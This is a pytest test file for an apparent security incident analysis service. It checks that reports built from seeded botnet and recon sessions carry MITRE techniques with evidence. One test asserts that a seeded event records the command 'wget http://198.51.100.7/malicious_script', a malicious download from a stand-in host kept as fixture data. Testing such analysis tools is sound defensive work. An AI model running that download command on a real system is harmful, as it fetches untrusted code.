import uuid

import httpx
import pytest
from sqlalchemy import select

from app.db.models import (
    Analysis,
    EvidenceRef,
    Indicator,
    IndicatorSession,
    ObservedBehavior,
    RecommendedAction,
)
from app.db.models import Report as ReportRow
from app.db.models import SuspiciousIndicator, TechniqueMapping
from app.db.session import get_session_factory
from app.main import create_app
from app.seed.seeder import seed
from app.services.analyzer import latest_for_session, run_analysis
from app.services.reports import create_report, list_reports

# Every test below either runs a real analysis or triggers one indirectly
# (create_report analyzes an unanalyzed session). Postgres is not reset
# between tests -- only the seeded ES documents are (see seed(reset=True))
# -- so each test cleans up the Analysis/Report rows and their children it
# created, the same inline try/finally pattern tests/test_analyzer.py and
# tests/test_intel.py use, to leave claim and indicator tables at zero rows
# regardless of test order.


async def _delete_report(report_id: str) -> None:
    factory = get_session_factory()
    async with factory() as db:
        row = await db.get(ReportRow, uuid.UUID(report_id))
        if row:
            await db.delete(row)
        await db.commit()


async def _delete_analysis_and_children(analysis_id: uuid.UUID) -> None:
    factory = get_session_factory()
    async with factory() as db:
        for model in (TechniqueMapping, ObservedBehavior, SuspiciousIndicator):
            rows = (
                (await db.execute(select(model).where(model.analysis_id == analysis_id)))
                .scalars()
                .all()
            )
            for row in rows:
                refs = (
                    (await db.execute(select(EvidenceRef).where(EvidenceRef.parent_id == row.id)))
                    .scalars()
                    .all()
                )
                for ref in refs:
                    await db.delete(ref)
                await db.delete(row)

        actions = (
            (
                await db.execute(
                    select(RecommendedAction).where(RecommendedAction.analysis_id == analysis_id)
                )
            )
            .scalars()
            .all()
        )
        for action in actions:
            await db.delete(action)

        analysis = await db.get(Analysis, analysis_id)
        if analysis:
            await db.delete(analysis)
        await db.commit()


async def _delete_indicators_for_session(session_id: str) -> None:
    factory = get_session_factory()
    async with factory() as db:
        links = (
            (
                await db.execute(
                    select(IndicatorSession).where(IndicatorSession.session_id == session_id)
                )
            )
            .scalars()
            .all()
        )
        indicator_ids = [link.indicator_id for link in links]
        for link in links:
            await db.delete(link)
        await db.flush()

        for indicator_id in indicator_ids:
            remaining = (
                (
                    await db.execute(
                        select(IndicatorSession).where(
                            IndicatorSession.indicator_id == indicator_id
                        )
                    )
                )
                .scalars()
                .first()
            )
            if remaining is None:
                row = await db.get(Indicator, indicator_id)
                if row:
                    await db.delete(row)
        await db.commit()


async def _cleanup(report_id: str, session_id: str) -> None:
    # The Report row's analysis_id FK must be gone before the Analysis it
    # points at is deleted.
    await _delete_report(report_id)
    analysis = await latest_for_session(session_id)
    if analysis is not None:
        await _delete_analysis_and_children(uuid.UUID(analysis.id))
    await _delete_indicators_for_session(session_id)


@pytest.mark.asyncio
async def test_report_assembles_from_a_completed_analysis() -> None:
    await seed(reset=True)
    await run_analysis("seed-botnet-01")
    report = await create_report("seed-botnet-01")
    try:
        assert report.session_id == "seed-botnet-01"
        assert report.executive_summary
        assert report.timeline
        assert report.incident_overview.attacker_ip == "185.220.101.44"
        assert 0 <= report.incident_overview.risk_score <= 100
        assert 0.0 <= report.attacker_behavior.confidence <= 1.0
    finally:
        await _cleanup(report.id, "seed-botnet-01")


@pytest.mark.asyncio
async def test_every_report_technique_carries_evidence() -> None:
    await seed(reset=True)
    await run_analysis("seed-botnet-01")
    report = await create_report("seed-botnet-01")
    try:
        for technique in report.mitre:
            assert technique.evidence
            for ref in technique.evidence:
                assert ref.event_id
    finally:
        await _cleanup(report.id, "seed-botnet-01")


@pytest.mark.asyncio
async def test_reports_are_listed_after_creation() -> None:
    await seed(reset=True)
    await run_analysis("seed-persist-01")
    created = await create_report("seed-persist-01")
    try:
        listed = await list_reports()
        assert any(r.id == created.id for r in listed)
    finally:
        await _cleanup(created.id, "seed-persist-01")


@pytest.mark.asyncio
async def test_report_for_an_unanalyzed_session_analyzes_first() -> None:
    await seed(reset=True)
    report = await create_report("seed-recon-01")
    try:
        assert report.attacker_behavior.classification
        assert report.session_id == "seed-recon-01"
    finally:
        await _cleanup(report.id, "seed-recon-01")


@pytest.mark.asyncio
async def test_event_endpoint_resolves_an_evidence_pointer() -> None:
    transport = httpx.ASGITransport(app=create_app())
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/api/events/seed-botnet-01-008")

    assert response.status_code == 200
    body = response.json()
    assert body["process"]["commandLine"] == "wget http://198.51.100.7/malicious_script"
    assert body["session"]["id"] == "seed-botnet-01"


@pytest.mark.asyncio
async def test_event_endpoint_404s_for_an_unknown_id() -> None:
    transport = httpx.ASGITransport(app=create_app())
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/api/events/not-a-real-event")

    assert response.status_code == 404
